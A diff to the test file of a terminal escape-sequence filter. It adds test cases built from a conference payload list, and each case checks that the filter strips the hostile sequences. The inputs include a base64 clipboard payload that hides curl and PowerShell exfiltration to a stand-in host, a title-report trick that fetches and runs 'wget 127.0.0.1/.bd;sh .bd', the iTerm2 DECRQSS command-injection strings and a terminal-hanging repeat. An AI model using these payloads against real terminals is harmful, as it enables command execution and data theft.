@@ -44,6 +44,68 @@ CASES = [
     ("a‮b⁦c​d﻿‍", "abcd‍"),
 ]
 
+# The payload list from Fredrik "STÖK" Alexandersson, "Weaponizing Plain Text: ANSI Escape Sequences as a
+# Forensic Nightmare" (DEF CON 31 / Black Hat USA 2023), appendix PDF at i.blackhat.com, decoded from its
+# printf/URL/JSON encodings to the bytes the terminal would see. Colour and cursor sequences pass: the filter
+# keeps what the TUI draws with (README: the guest can still paint the screen). Everything that reaches past
+# the screen, or makes the terminal wait or do unbounded work, must come out as plain text or nothing.
+POLYGLOT_B64 = (   # OSC 52 payload that is an SVG-with-script data: URL, a curl and a PowerShell line at once
+    "CgoKCgpkYXRhOmltYWdlL3N2Zyt4bWw7YmFzZTY0LFBITjJaeUIyWlhKemFXOXVQU0l4TGpFaUlHSmhjMlZRY205bWFXeGxQU0ptZFd4c0lpQjRiV3h1"
+    "Y3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzl6ZG1jaVBnb2dJRHh6WTNKcGNIUWdkSGx3WlQwaWRHVjRkQzlxWVhaaGMyTnlhWEIwSWo0"
+    "S0lDQWdJR0ZzWlhKMEtDSnBibXBsWTNScGIyNGdjM1ZqWTJWemMyWjFiQ0lwT3dvZ0lEd3ZjMk55YVhCMFBnbzhMM04yWno0PSMKCmN1cmwgImh0dHA6"
+    "Ly8kKHdob2FtaSkuJChob3N0bmFtZSkucmNlcG9jLjEyNy4wLjAuMS5uaXAuaW8vJChwd2QgfCBiYXNlNjQpIgoKY21kIC9jIHBvd2Vyc2hlbGwgLUNv"
+    "bW1hbmQgIiRVUkkgPSAnaHR0cDovLyV1c2VybmFtZSUuJWNvbXB1dGVybmFtZSUucmNlcG9jLjEyNy4wLjAuMS5uaXAuaW8vJztJbnZva2UtV2ViUmVx"
+    "dWVzdCAtVXJpICRVUkkiCg=="
+)
+assert len("52;c;" + POLYGLOT_B64) > cf.MAX_OSC   # so this one takes the over-long OSC path
+APPENDIX = [
+    # basics: SGR colour and BEL pass unchanged; a bare ESC left at the end of the stream is held, not emitted
+    (f"Hello {E}[32mTHIS IS GREEN{E}[0m\x07", f"Hello {E}[32mTHIS IS GREEN{E}[0m\x07"),
+    (f"{E}[31mESC-INJECTION:{E}[32mSUCCESSFUL{E}[0m{E}", f"{E}[31mESC-INJECTION:{E}[32mSUCCESSFUL{E}[0m"),
+    # the JSON-unicode / URL-encoded log-injection probes decode to the same colour sequences: they pass
+    (f"somevalue\n{E}[31mESC-INJECTION-LFUNICODE:{E}[32mSUCCESSFUL{E}[0m\x07\n",
+     f"somevalue\n{E}[31mESC-INJECTION-LFUNICODE:{E}[32mSUCCESSFUL{E}[0m\x07\n"),
+    # H D Moore 2003: set the title to a command, ask the terminal to type it back (CSI 21 t), hide the echo.
+    # The title sets pass (and are popped at RESET); the report, the step that types, is dropped.
+    (f"{E}]2;;wget 127.0.0.1/.bd;sh .bd;exit;\x07{E}[21t{E}]2;xterm\x07Press Enter>{E}[8m",
+     f"{E}]2;;wget 127.0.0.1/.bd;sh .bd;exit;{ST}{E}]2;xterm{ST}Press Enter>{E}[8m"),
+    # ush.it 2010 httpd log injection: an empty title, then the request's CR/LFs
+    (f"GET /{E}]2;\x07\n\r\n\r", f"GET /{E}]2;{ST}\n\r\n\r"),
+    # OSC 8 hyperlinks: http, a bare BEL-terminated one, and the file: URI pointing at cmd.exe
+    (f"{E}]8;;http://example.com{ST}This is a link{E}]8;;{ST}", "This is a link"),
+    (f"{E}]8;;http://evil.terminalinjection.com\x07", ""),
+    (f"An error has occured. Visit {E}]8;;file://c:\\Windows\\System32\\cmd.exe{ST}https://learn.microsoft.com/KB123YOLO{E}]8;;{ST} To learn more",
+     "An error has occured. Visit https://learn.microsoft.com/KB123YOLO To learn more"),
+    # OSC 52 clipboard: "open -a calculator.app", "sleep 1; echo Hello $(whoami)", and the polyglot (over MAX_OSC)
+    (f"{E}]52;c;b3BlbiAtYSBjYWxjdWxhdG9yLmFwcAoK\x07", ""),
+    (f"{E}]52;c;c2xlZXAgMQplY2hvIEhlbGxvICQod2hvYW1pKQoK\x07", ""),
+    (f"{E}]52;c;{POLYGLOT_B64}\x07ok", "ok"),
+    # hide your tracks: cursor home and erase screen pass (the TUI needs them); iTerm2 ClearScrollback does not
+    (f"{E}[H\x07{E}]1337;ClearScrollback\x07{E}[2J\x07", f"{E}[H\x07{E}[2J\x07"),
+    # print: CSI 0 i (print screen) and CSI 5 i (redirect output to the printer)
+    (f"{E}[0i\x07{E}[5i\x07", "\x07\x07"),
+    # hijack the mouse: every mode passes except 1001 (hilite tracking hangs xterm without a cooperating program)
+    (f"{E}[?1001h{E}[?1002h{E}[?1003h{E}[?1004h{E}[?1005h{E}[?1006h{E}[?1007h{E}[?1015h{E}[?10016h",
+     f"{E}[?1002h{E}[?1003h{E}[?1004h{E}[?1005h{E}[?1006h{E}[?1007h{E}[?1015h{E}[?10016h"),
+    (f"{E}[?1001l{E}[?1;1001h", ""),
+    # REP: ten repeats pass; a billion (the "bricked" slide, plain and URL-encoded with U+FE0F) is dropped
+    (f"\u270c{E}[10;b\x07", f"\u270c{E}[10;b\x07"),
+    (f"\u270c{E}[1000000000;b\x07", "\u270c\x07"),
+    (f"\u270c\ufe0f{E}[1000000000;b\x07", "\u270c\ufe0f\x07"),
+    (f"{E}[99999;1H{E}[999999;1H{E}[38;2;255;255;255m", f"{E}[99999;1H{E}[38;2;255;255;255m"),
+    # iTerm2 DECRQSS RCE (CVE-2022-45872, David Leadbeater): the three DCS strings, alone and as the one request
+    (f"{E}P$qm\x03{ST}{E}P$qm;open -a calculator;\r\n{ST}{E}P$qm{ST}", ""),
+    (f"sup\n{E}[31mESC-INJECTION-SUCCESSFUL-LETS-POP-CALC{E}[0m\x07\n{E}P$qm\x03{ST}{E}P$qm;open -a calculator;\r{ST}{E}P$qm{ST}",
+     f"sup\n{E}[31mESC-INJECTION-SUCCESSFUL-LETS-POP-CALC{E}[0m\x07\n"),
+    # a DCS "terminated" by BEL is not terminated: like a terminal, the filter swallows text up to the next ESC
+    (f"{E}P$qm\x03\x07X{E}[0m", f"{E}[0m"),
+    # kitty OSC 5113 file transfer: terminated, with a newline-injected id, and the slide's unterminated form
+    (f"{E}]5113;ac=send;id=test;n=aGVsbG8udHh0;sz=3;d=AQID{ST}", ""),
+    (f"{E}]5113;ac=send;id=\nopen -a calculator.app\n{ST}", ""),
+    (f"{E}]5113;ac=send;id=test;n=aGVsbG8udHh0;sz=3;d=AQID\\\\\n{E}[32mok", f"{E}[32mok"),
+]
+CASES += APPENDIX
+
 
 def run(chunks):
     f = cf.Filter()
@@ -92,7 +154,7 @@ for _ in range(20000):
 if cf.START != f"{E}[22;0t" or not cf.RESET.endswith(f"{E}[23;0t") or f"{E}[!p" not in cf.RESET or f"{E}[r" not in cf.RESET:
     failed += 1
     print("FAIL START/RESET title push/pop or soft reset missing")
-for seq in (f"{E}[>4;0m", f"{E}[20l", f"{E}[?1l", f"{E}>", f"{E}[?1049l", f"{E}[?25h"):
+for seq in (f"{E}[>4;0m", f"{E}[20l", f"{E}[?1l", f"{E}>", f"{E}[?1049l", f"{E}[?25h", f"{E}[?1001l", f"{E}[?1007l"):
     if seq not in cf.RESET:
         failed += 1
         print(f"FAIL RESET lacks {seq!r}")
